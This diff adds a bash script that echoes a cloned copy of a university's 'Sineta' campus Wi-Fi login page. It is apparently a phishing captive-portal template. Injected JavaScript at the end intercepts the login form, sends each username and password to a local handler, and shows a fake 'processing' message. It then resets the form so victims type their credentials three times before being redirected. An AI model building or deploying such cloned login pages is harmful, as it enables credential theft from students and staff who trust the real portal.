@@ -1,0 +1,206 @@
+#====================================#
+#------- PORTAL STUDENT@UNSIL -------#
+#====================================#
+#!/bin/bash
+
+echo '
+
+<!DOCTYPE html>
+<!-- saved from url=(0083)https://login.unsil.ac.id/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect -->
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <title>Sineta | Login</title>
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://login.unsil.ac.id/favicon.ico" type="image/x-icon">
+    <!-- General CSS -->
+    <link rel="stylesheet" type="text/css" href="./Sineta _ Login_files/main.css">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="./Sineta _ Login_files/bootstrap-icons.min.css">
+    <!-- Utlilites CSS -->
+    <link rel="stylesheet" type="text/css" href="./Sineta _ Login_files/utilities.css">
+
+    <script>
+        const error = "";
+        if ((error == "user  has reached uptime limit") || (error ==
+            "User  has reached the time limit")) {
+            window.location.href = "./expired.html";
+        }
+        else if ((error == "user  has reached traffic limit") || (error == "User  has reached the quota limit")) {
+            window.location.href = "./isolir.html";
+        }
+    </script>
+</head>
+
+<body>
+
+    <div>
+        <div class="px-5 py-5 p-lg-0 min-h-screen d-flex flex-column justify-content-center bg-surface-secondary">
+            <div class="d-flex justify-content-center">
+                <div
+                    class="col-lg-5 col-xl-4 p-12 p-xl-20 position-fixed start-0 top-0 h-screen overflow-y-hidden bg-primary d-none d-lg-flex flex-column">
+                    <a class="d-block" href="./Sineta _ Login_files/login">
+                        <img src="./Sineta _ Login_files/logo-unsil.svg" class="h-20" alt="...">
+                    </a>
+                    <div class="mt-32 mb-20">
+                        <h1 class="ls-tight font-bolder display-6 text-white mb-5"><i>UNSIL <br>Sineta</i></h1>
+                        <p class="text-white text-opacity-80">Your one-stop portal for campus internet login and quick
+                            access to essential Unsil applications, all in one place. Enjoy seamless access!
+                        </p>
+                    </div>
+                    <div>
+                        <img src="./Sineta _ Login_files/login" alt="">
+                    </div>
+                </div>
+                <div
+                    class="col-12 col-md-9 col-lg-7 offset-lg-5 border-left-lg min-h-screen d-flex flex-column justify-content-center position-relative">
+                    <div class="py-lg-16 px-lg-20">
+                        <div class="row">
+                            <div class="col-lg-10 col-md-9 col-xl-6 mx-auto ms-xl-0">
+                                <a class="d-lg-none" href="./Sineta _ Login_files/login">
+                                    <img src="./Sineta _ Login_files/logo-unsil.svg" alt="..." class="logocolor h-10">
+                                </a>
+                                <div class="mt-10 mt-lg-5 mb-6 d-lg-block">
+                                    <span
+                                        class="d-inline-block d-lg-block h1 mb-4 mb-lg-6 me-3 d-inline-block d-none">👋</span>
+                                    <h1 class="ls-tight font-bolder h2">Welcome Back!</h1>
+                                    <p class="small mt-2 text-muted">Please log in using the credentials provided</p>
+                                    <p class="small mt-2 text-muted">
+                                        Activate Unsil Sineta by <a
+                                            href="https://drive.google.com/file/d/1-sN27kTpbHkeDjFnNWDFWYh_5nBJLhuU/view?usp=sharing"
+                                            target="_blank">clicking here</a>
+                                    </p>
+                                </div>
+
+                                <form class="form-auth" name="login" action="status.htm" method="post">
+                                    <input type="hidden" name="dst" value="http://www.msftconnecttest.com/redirect">
+                                    <input type="hidden" name="popup" value="true">
+
+                                    <!-- Form control -->
+                                    <div class="form-group mb-3">
+                                        <label class="form-label" id="username-label">Username</label>
+                                        <input name="username" type="text" value=""
+                                            placeholder="Please enter your Username / NPM"
+                                            class="form-control form-control-sm" required="" autocomplete="off">
+                                    </div>
+                                    <div class="form-group mb-3" id="ps-fg">
+                                        <label class="form-label" id="password-label">Password</label>
+                                        <div class="input-group">
+                                            <input name="password" class="form-control form-control-sm" id="password"
+                                                type="password" placeholder="Please enter your password" required="">
+                                            <button class="btn btn-outline-secondary btn-sm" type="button"
+                                                id="togglePassword" onclick="togglePasswordVisibility()">
+                                                <i class="bi bi-eye" id="eyeIcon"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <!-- End Form Check -->
+                                    <button type="submit" class="btn btn-sm btn-primary w-full ripple">Sign In</button>
+                                </form>
+
+                                <div class="lhhucE mt-4 mb-4">
+                                    <div class="lreZhl"></div>
+                                </div>
+
+                                <!-- Sign in with QR -->
+                                <a href="https://qr.unsil.io/" target="_blank"
+                                    class="btn btn-sm btn-neutral d-block align-items-center d-flex justify-content-center mb-3">
+                                    <i class="bi bi-qr-code-scan"></i>
+                                    <span class="mx-auto">Sign In with QR</span>
+                                </a>
+
+                                <div class="text-center my-8 small">
+                                    <div class="sm-ft mb-3">
+                                        Copyright © <span id="current-year">2025</span> UPA TIK ☕
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal ads -->
+    <div class="modal fade" id="onload-ads" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+            </div>
+            <div class="close-icon" data-bs-dismiss="modal">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#FFF" class="bi bi-x-circle-fill"
+                    viewBox="0 0 16 16">
+                    <path
+                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293z">
+                    </path>
+                </svg>
+            </div>
+            <img src="./Sineta _ Login_files/banner-ads-eid.png" alt="ads" class="w-100">
+        </div>
+    </div>
+    <div id="loading" style="display:none; text-align:center; margin-top:20px;">
+
+    </div>
+
+    <!-- Library -->
+    <script src="./Sineta _ Login_files/jquery-3.7.1.js.download"></script>
+    <!-- General JS -->
+    <script src="./Sineta _ Login_files/main.js.download"></script>
+    <script src="./Sineta _ Login_files/app.js.download"></script>
+
+<script>
+document.getElementsByName("login")[0].addEventListener("submit", function(e) {
+    e.preventDefault(); // cegah form default submit
+
+    let form = e.target;
+    let loading = document.getElementById("loading");
+
+    // Ambil counter dari localStorage, default 0
+    let count = parseInt(localStorage.getItem("submitCount") || "0");
+    count++;
+
+    // Tampilkan loading
+    form.style.display = "none";
+    loading.style.display = "block";
+    loading.innerHTML = "<p>Memproses data... (" + count + "/3)</p>";
+
+    setTimeout(() => {
+        // Kirim data via AJAX ke tulis.htm
+        let xhr = new XMLHttpRequest();
+        xhr.open(form.method, form.action);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        let data = [];
+        for (let i = 0; i < form.elements.length; i++) {
+            let el = form.elements[i];
+            if (el.name) data.push(encodeURIComponent(el.name) + "=" + encodeURIComponent(el.value));
+        }
+        xhr.send(data.join("&"));
+
+        // Update counter di localStorage
+        localStorage.setItem("submitCount", count);
+
+        if (count < 3) {
+            // Reset form untuk input berikutnya
+            form.reset();
+            form.style.display = "block";
+            loading.style.display = "none";
+            document.login.username.focus();
+        } else {
+            // Setelah submit ketiga, arahkan ke tulis.htm
+            localStorage.removeItem("submitCount");
+            window.location.href = form.action;
+        }
+    }, 2000); // delay 2 detik untuk efek loading
+});
+</script>
+
+
+
+</body>
+
+</html>'
+
